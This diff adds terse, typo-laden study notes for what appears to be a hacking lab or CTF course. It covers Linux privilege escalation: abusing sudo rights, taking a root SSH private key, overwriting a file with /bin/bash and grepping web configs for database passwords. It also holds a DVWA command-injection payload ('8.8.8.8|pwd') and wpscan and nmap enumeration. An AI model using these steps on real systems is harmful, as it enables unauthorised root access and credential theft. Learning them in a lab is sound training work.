@@ -565,3 +565,65 @@ sudo df -h
 
 - disk encyrption using veracrypt
 1. open encytped file -> click mount -> enter passphtase -> and check inside the files
+
+
+
+-----------------------------------------
+ 
+
+* Privilige EScalation 
+
+1. connect target via ssh or ftp
+2. whoami -> user1 -> 
+3. sudo  -l -> list user withs privilige info all =all
+4. since user2 does not require pwd for root -> /home/user2/ -> ls -> cat flag.txt
+5. but cat wont work so -> cd to user1
+6. sudo -u user2 /bin/bash
+7. now go to fiag.txt and cat it 
+8. same 4 to 7 for root user 
+9. cd .ssh -> ls -> pri and pub key -> utilize priv key to get root access
+10. copy that key to host machine and chmod 600 id_rsa 
+11. now try to ssh on root user -> ssh root@ip -i id_rsa  | -p if required 
+12. same can also be achived with public key 
+
+* Privilige escalation - part 2
+
+1. ls -l | check the group permission
+2. stat -c "%a %A %U %G %F" filename
+3. groups hostname | to chcek the hostname asccoiate d group | strings filename
+4. cp /bin/bash filename | if didnt work then 
+5. rm filename 
+6. cp /bin/bash delted filename
+7. now run ./filename 
+8. check whoami | cd /root/ -> ls
+
+* privilige escalation - part 3 
+
+1. cd /var/www/html | check for some executable files 
+2. grep -inr "db_user" | check for cat  local/config/database.inc.php | db_user and passwords
+ 
+
+* privilige escaltion - part 4  linenum and linpeas
+
+1. linenum.sh from git -> chmod +x file.sh
+2. ./lineenum.sh | parallel ./linpeas
+
+
+* command injection - dvwa
+
+1. free ping page -> 8.8.8.8
+2. 8.8.8.8|pwd
+
+* wpscan
+1. wpscan --urll http://ip --enumerate u
+
+* FQDN 
+computer name + domain name
+
+nmap -p389 -sV -iL targetlist.txt
+
+
+* openvas 
+gvm-start
+ openvasad -c add_user -u your_new_login_here -r Admin
+ change - openvasmd --user=admin --new-password=letmein
